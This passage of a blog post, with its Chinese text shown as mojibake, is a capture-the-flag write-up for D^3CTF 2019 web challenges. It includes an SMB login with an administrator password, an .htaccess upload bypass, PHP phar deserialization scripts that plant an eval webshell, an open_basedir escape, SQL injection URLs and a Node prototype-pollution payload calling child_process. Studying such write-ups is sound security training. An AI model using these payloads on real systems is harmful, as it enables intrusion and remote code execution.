<p><a href="https://doc.u0u.us/zh-hans/getting_started/get_antsword.html" target="_blank" rel="noopener">https://doc.u0u.us/zh-hans/getting_started/get_antsword.html</a> </p>
</blockquote>
<p>å…ˆä¸‹è½½åŠ è½½å™¨ï¼Œå†åŠ è½½æºç å³å¯</p>
<p><img src="https://i.loli.net/2019/11/26/IhSqxMZue3bE62K.png" alt="Snipaste_2019-11-26_18-24-03.png"></p>
<p>å‰äººæ ½æ ‘ï¼Œå‘ç°12æ–‡ä»¶å¤¹å·²ç»ä¸Šä¼ å¥½äº†<code>hydra</code>ï¼Œå½“æ—¶è‡ªå·±ä¸Šä¼ ä¹Ÿè¡Œï¼Œå°±æ˜¯æœ‰ç‚¹ä¸ç¨³å®š</p>
<p><img src="https://i.loli.net/2019/11/26/zQuNSM6aDphtjGT.png" alt="Snipaste_2019-11-26_18-34-18.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\172.19.97.8\ipc$ eDHU27TlY6ugslV &#x2F;user:administrator</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\172.19.97.8\c$</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\172.19.97.8\c$\Users\Administrator\Desktop\flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/11/26/28KSVWq54begcR9.png" alt="Snipaste_2019-11-26_18-37-44.png"></p>
<p><strong>è¿™æ–¹é¢çœŸçš„æ˜¯ç›²åŒºã€‚ã€‚ã€‚å¤ç°æˆåŠŸè¿˜æ˜¯æŒºæœ‰æ„Ÿè§‰çš„</strong></p>
<h3><span id="ezupload">ezupload</span></h3><p><img src="https://i.loli.net/2019/11/26/PkJlfyXTe194CzS.png" alt="Snipaste_2019-11-26_19-28-25.png"></p>
<p>å…ˆçœ‹çœ‹è¿‡æ»¤æ–¹æ³•</p>
<p><img src="https://i.loli.net/2019/11/26/swkdhnaJBEHAI1Y.png" alt="Snipaste_2019-11-26_19-30-57.png"></p>
<p><code>phåç¼€</code>è¢«banäº†ï¼Œæƒ³åˆ°<code>.htaccess</code></p>
<p><img src="https://i.loli.net/2019/11/27/RzdyHS7uTvVl5k2.png" alt="Snipaste_2019-11-27_08-05-37.png"></p>
<p>ä½†æ˜¯å¯¹å†…å®¹å­˜åœ¨é™åˆ¶ï¼Œä¸‹é¢ä¸¤ç§æ— æ³•ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br><span class="line">php_value auto_prepend_file &quot;&#x2F;home&#x2F;fdipzone&#x2F;header.php&quot;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure>

<p><code>file://</code>å’Œ<code>php://</code>è¢«banäº†ï¼Œåˆ©ç”¨<code>data://</code>æˆ–è€…<code>http://</code>åè®®</p>
<p>å…ˆå°è¯•å†™å…¥<code>.htaccess</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure>

<p>è°ƒè¯•æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯<code>windows</code>ç”±äºæ— æ³•å†™å…¥<code>.</code>å¼€å¤´çš„æ–‡ä»¶ï¼Œåˆ‡æ¢åˆ°<code>linuxä¸‹</code></p>
<p><strong>ä¸­é—´å‡ºç°äº†ç‚¹å°æŠ¥é”™æŸ¥çœ‹<code>error_log</code>å³å¯</strong></p>
<p><img src="https://i.loli.net/2019/11/27/vSKFjUPlu7RcLWy.png" alt="Snipaste_2019-11-27_08-54-49.png"></p>
<p>å†å¼€å¯ä¸‹æ‰©å±•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoadModule rewrite_module modules&#x2F;mod_rewrite.so</span><br><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure>

<p>çªç„¶å‘ç°äº‹æƒ…å¹¶ä¸ç®€å•ğŸ˜±ã€‚ã€‚ã€‚ä¸ºå•¥ä¹‹å‰<code>__destruct()</code>å†™å…¥çš„æ–‡ä»¶ä¸å­˜åœ¨ã€‚ã€‚<code>error_log</code>çœ‹ä¸€ä¸‹æç¤ºæ²¡æœ‰æƒé™ã€‚ã€‚ã€‚ä½†æ˜¯åŒæ ·çš„æƒé™<code>.htaccess</code>æˆåŠŸåˆ›å»º</p>
<p>è¿™å…¶å®ç®—æ˜¯ä¸€ä¸ªæç¤ºæŠŠï¼Œæœ¬åœ°æµ‹ä¸€ä¸‹<code>__destruct()</code>çš„å½“å‰è·¯å¾„</p>
<p><img src="https://i.loli.net/2019/11/27/TNi5XDZfraV6Rmb.png" alt="Snipaste_2019-11-27_09-54-36.png"></p>
<p><img src="https://i.loli.net/2019/11/27/6kdWOJgIhsQ285x.png" alt="Snipaste_2019-11-27_09-53-57.png"></p>
<p>å‘ç°åœ¨æ ¹ç›®å½•ï¼Œé‚£ä¹ˆè¿™é‡Œè¦å†™å…¥çš„è¯å¯ä»¥é€šè¿‡è§¦å‘ååºåˆ—åŒ–æ¥å†™å…¥ï¼Œæ­£å¥½ä¹‹å‰çš„<code>phar://</code>æ²¡æœ‰è¢«<code>ban</code></p>
<p>å¹¶ä¸”<code>phar</code>æ˜¯å¯ä»¥<code>gzip</code>å‹ç¼©çš„ï¼Œä»è€Œç»•è¿‡å¯¹æŸäº›å­—ç¬¦çš„æ£€æŸ¥</p>
<p>é‚£ä¹ˆè¿˜éœ€è¦è§£å†³<code>__destruct()</code>ä¸­å†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„çš„é—®é¢˜ï¼Œåˆ—ç›®å½•</p>
<p>åˆ©ç”¨<code>__toString()</code></p>
<p><img src="https://i.loli.net/2019/11/27/YaWvmLp3OUBqtJ6.png" alt="Snipaste_2019-11-27_10-36-03.png"></p>
<p>ä¸¾ä¸ªä¾‹å­</p>
<p><img src="https://i.loli.net/2019/11/27/RguSfOekB6i4rQL.png" alt="Snipaste_2019-11-27_10-37-02.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å…ˆè·å–ç»å¯¹è·¯å¾„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class dir&#123;</span><br><span class="line">		public $userdir;</span><br><span class="line">		public $filename;</span><br><span class="line">		public $url;</span><br><span class="line">		public function __construct($url,$filename) &#123;</span><br><span class="line">			$this-&gt;url &#x3D; $url;</span><br><span class="line">       		$this-&gt;filename  &#x3D;  $filename;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a &#x3D; new dir(&#39;a&#39;,&#39;a&#39;);</span><br><span class="line">    $a -&gt; userdir &#x3D; &#39;..&#x2F;&#39;;</span><br><span class="line">    $b &#x3D; new dir(&#39;b&#39;,&#39;b&#39;);</span><br><span class="line">    $b -&gt; userdir &#x3D; $a;</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stub</span><br><span class="line">    $phar-&gt;setMetadata($b); &#x2F;&#x2F;å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="line">    &#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®—</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>filename</code>ä¸ºæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ï¼Œå…ˆæ”¾åˆ°vpsä¸Šï¼Œå‹ç¼©æˆ<code>gz</code>ï¼Œé‡å‘½åä¸º1</p>
<p><img src="https://i.loli.net/2019/11/27/vdVAHwKnIbmN6pc.png" alt="Snipaste_2019-11-27_11-19-51.png"></p>
<p>pharååºåˆ—åŒ–</p>
<p><img src="https://i.loli.net/2019/11/27/M3xAYDjqUwGeQgC.png" alt="Snipaste_2019-11-27_11-19-15.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬çš„ç»å¯¹è·¯å¾„å°±çŸ¥é“äº†ï¼Œ<code>/var/www/html/50f3c73883917b44/e9afd20997dff75e292259158f0006fb</code>ï¼Œæˆ‘æœ¬æ¥è¿˜æƒ³å†çœ‹ä¸Šä¸€çº§ç›®å½•ï¼Œæç¤º<code>hacker!!</code>ï¼Œåº”è¯¥æ˜¯å‹ç¼©åä»ç„¶è¢«æ£€æµ‹åˆ°äº†æŸäº›å­—ç¬¦ã€‚ã€‚ç›´æ¥ä¸€ä¸‹æ­¥</p>
<p>åˆ©ç”¨ååºåˆ—åŒ–å†™<code>.txt</code>æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class dir&#123;</span><br><span class="line">		public $userdir;</span><br><span class="line">	    public $url;</span><br><span class="line">	    public $filename;</span><br><span class="line">	    public function __construct($url,$filename) &#123;</span><br><span class="line">	        $this-&gt;url &#x3D; $url;</span><br><span class="line">	        $this-&gt;filename  &#x3D;  $filename;</span><br><span class="line">	    &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    $a &#x3D; new dir(&#39;a&#39;,&#39;a&#39;);</span><br><span class="line">    $a -&gt; filename &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;6d4bcfa605eacb74&#x2F;upload&#x2F;e9afd20997dff75e292259158f0006fb&#x2F;glotozz&#39;;</span><br><span class="line">    $a -&gt; userdir &#x3D; &#39;&lt;?php phpinfo();eval($_POST[cmd]);?&gt;&#39;;</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stub</span><br><span class="line">    $phar-&gt;setMetadata($a); &#x2F;&#x2F;å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="line">    &#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®—</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/11/27/oEMqHGc9VDJNvrX.png" alt="Snipaste_2019-11-27_11-44-46.png"></p>
<p><img src="https://i.loli.net/2019/11/27/l3hdoCLcsYvGqrU.png" alt="Snipaste_2019-11-27_11-45-12.png"></p>
<p><img src="https://i.loli.net/2019/11/27/4e2nM9P8QAtsRjU.png" alt="Snipaste_2019-11-27_12-36-35.png"></p>
<p>åˆæ˜¯è€å¥—è·¯ã€‚ã€‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/11/27/2xOCqmYKzutWy4d.png" alt="Snipaste_2019-11-27_11-47-34.png"></p>
<p><strong><code>webroot in /var/www/html+webroot changes</code>ä¸€èˆ¬å°±æ˜¯å†åŠ ä¸€ä¸ªæ²™ç®±</strong></p>
<p><strong>.htaccessçš„å…¶ä»–å†™æ³•<code>AddHandler php7-script .txt</code></strong></p>
<p><strong>__destruct()çš„è·¯å¾„ä¸ºæ ¹ç›®å½•</strong></p>
<p><strong>pharå‹ç¼©(â½¤gzip)ç»•è¿‡å­—ç¬¦æ£€æµ‹</strong></p>
<p><strong><code>glob://</code>ä¹Ÿå¯ä»¥ç”¨æ¥ç»•è¿‡open_basedirã€‚ã€‚ã€‚ã€‚</strong></p>
<h3><span id></span></h3><h3><span id="ezts">ezts</span></h3><p>======æœªå®Œå¾…ç»­</p>
<p>å§æ§½ï¼Œï¼Œç¯å¢ƒå…³äº†ã€‚ã€‚é‚£ä¹ˆè®°å½•ä¸‹æ€è·¯</p>
<blockquote>
<p>KOAæ¡†æ¶<a href="https://github.com/koajs/koa" target="_blank" rel="noopener">https://github.com/koajs/koa</a><br><a href="https://github.com/d-band/koa-orm" target="_blank" rel="noopener">https://github.com/d-band/koa-orm</a></p>
</blockquote>
<p>æˆ‘æ„Ÿè§‰ä¹‹åwpè¿™ä¸ªåº”è¯¥æ˜¯<code>fuzz</code>å‡ºæ¥çš„</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;df8aea7e00.ezts.d3ctf.io&#x2F;search?key&#x3D;1&#39;))%20or%20((%271&amp;value&#x3D;1</span><br><span class="line">http:&#x2F;&#x2F;df8aea7e00.ezts.d3ctf.io&#x2F;search?key&#x3D;1&#39;))%20or%201%23&amp;value&#x3D;1</span><br><span class="line">http:&#x2F;&#x2F;df8aea7e00.ezts.d3ctf.io&#x2F;search?key&#x3D;1&#39;))%20or%20(ascii(substr((select%20version()),1,1))%3E10)%23&amp;value&#x3D;1</span><br></pre></td></tr></table></figure>

<p>ç›²æ³¨è„šæœ¬å‡ºadminè´¦å·å¯†ç </p>
<p>åŸå‹é“¾æ±¡æŸ“</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execS...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>/flag æ˜¯root 400æƒé™, ç°åœ¨æ˜¯nodeâ½¤â¼¾,</p>
</blockquote>
<p>è¿˜éœ€è¦ææƒä¸€ä¸‹</p>
<blockquote>
<p>CVE-2019-14287</p>
</blockquote>
<h3><span id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥:</span></h3><p> <a href="https://wx.zsxq.com/dweb2/index/group/824215518412" target="_blank" rel="noopener">https://wx.zsxq.com/dweb2/index/group/824215518412</a> </p>
<p> <a href="https://nikoeurus.github.io/2019/11/26/D^3ctf-Web/#ezupload" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/#ezupload</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>æœ¬æ–‡ä½œè€…ï¼š</strong>
              <a href="/" title="æ¬¢è¿è®¿é—® glotozz çš„ä¸ªäººåšå®¢">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>
               æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ CC BY-NC-SA 4.0 è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/wp/" rel="tag"><i class="fa fa-tag"></i> wp</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2019/12/01/tp6-0-0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">tp6.0.0ååºåˆ—åŒ–æ¼æ´åˆ†æ</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2019/11/24/LFIToRCE%E6%80%9D%E8%B7%AF/">
        <span class="next-text nav-default">LFIToRCEæ€è·¯</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- ä»£ç å—å¤åˆ¶åŠŸèƒ½ -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
